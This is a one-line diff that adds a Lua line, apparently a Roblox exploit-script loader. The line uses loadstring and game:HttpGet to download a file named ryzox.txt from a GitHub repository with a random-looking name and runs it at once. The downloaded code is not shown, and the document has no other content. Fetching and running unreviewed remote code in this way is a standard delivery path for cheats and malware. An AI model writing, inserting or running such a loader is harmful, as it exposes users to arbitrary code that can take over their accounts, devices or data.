@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dereszewski/fugrehjbfnmew/refs/heads/main/ryzox.txt"))()
